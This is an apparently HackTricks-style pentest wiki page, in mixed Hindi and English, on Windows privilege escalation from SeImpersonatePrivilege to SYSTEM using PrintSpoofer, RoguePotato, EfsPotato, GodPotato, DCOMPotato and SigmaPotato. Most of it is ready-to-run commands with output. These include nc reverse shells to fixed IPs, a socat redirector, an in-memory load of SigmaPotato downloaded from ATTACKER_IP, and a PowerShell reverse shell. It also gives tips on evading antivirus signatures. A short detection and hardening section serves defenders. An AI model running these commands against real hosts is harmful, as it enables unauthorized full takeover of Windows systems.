# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato काम नहीं करता** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान विशेषाधिकार भुनाने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच प्राप्त करने के लिए किया जा सकता है। This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य सावधानियाँ

निम्नलिखित सभी तकनीकें एक impersonation-capable privileged service का दुरुपयोग करने पर निर्भर करती हैं, जो उस संदर्भ से की जाती हैं जिसमें निम्नलिखित में से कोई एक विशेषाधिकार मौजूद होता है:

- SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
- High integrity आवश्यक नहीं है अगर टोकन में पहले से SeImpersonatePrivilege मौजूद हो (आम तौर पर कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए)

विशेषाधिकार शीघ्र जाँचें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशनल नोट्स:

- PrintSpoofer को Print Spooler सेवा चल रही और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य होना चाहिए। कठोर-सुरक्षित वातावरणों में जहाँ Spooler को PrintNightmare के बाद disabled किया गया हो, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver चाहिए। अगर egress blocked है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने builds में -f flag की जरूरत होती थी।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; अगर एक pipe blocked है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आम तौर पर किसी अज्ञात/असमर्थित RPC authentication service को दर्शाता है; कोई अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही है।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट:
- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रोसेस शुरू करने के लिए कर सकते हैं, या -c का उपयोग एक वन-लाइनर चलाने के लिए कर सकते हैं।
- Spooler सेवा आवश्यक है। यदि यह अक्षम है, तो यह विफल होगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 अवरुद्ध है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: यदि किसी एक pipe में विफलता हो या EDR उसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notes:
- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato दो वेरिएंट प्रदान करता है जो service DCOM objects को लक्षित करते हैं जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर सेट होते हैं। प्रदान किए गए binaries को बनाएं या उनका उपयोग करें और अपना command चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (अपडेटेड GodPotato fork)

SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे .NET reflection के माध्यम से in-memory execution और एक PowerShell reverse shell helper।
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## डिटेक्शन और हार्डनिंग नोट्स

- नामित पाइप बना रहे प्रक्रियाओं की निगरानी करें और तुरंत token-duplication APIs को कॉल करने के बाद CreateProcessAsUser/CreateProcessWithTokenW को कॉल करने वाली गतिविधियों पर ध्यान दें। Sysmon उपयोगी टेलीमेट्री दिखा सकता है: Event ID 1 (process creation), 17/18 (named pipe created/connected), और वे कमांड लाइन जो SYSTEM के रूप में child processes को spawn करती हैं।
- Spooler hardening: जिन सर्वरों पर Print Spooler सेवा आवश्यक नहीं है, वहां इसे डिसेबल करने से spoolss के माध्यम से होने वाले PrintSpoofer-style local coercions रोके जा सकते हैं।
- Service account hardening: कस्टम सेवाओं को SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege असाइन करना कम से कम रखें। सेवाओं को आवश्यक न्यूनतम privileges वाले virtual accounts के तहत चलाने पर विचार करें और जहाँ संभव हो उन्हें service SID और write-restricted tokens के साथ अलग-थलग रखें।
- Network controls: आउटबाउंड TCP/135 को ब्लॉक करना या RPC endpoint mapper ट्रैफ़िक को सीमित करना RoguePotato को प्रभावित कर सकता है जब तक कि कोई internal redirector उपलब्ध न हो।
- EDR/AV: इन सभी टूल्स के लिए व्यापक सिग्नेचर मौजूद हैं। source से recompile करना, symbols/strings का नाम बदलना, या in-memory execution का उपयोग detection को कम कर सकता है पर मजबूत behavioral detections को परास्त नहीं करेगा।

## संदर्भ

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
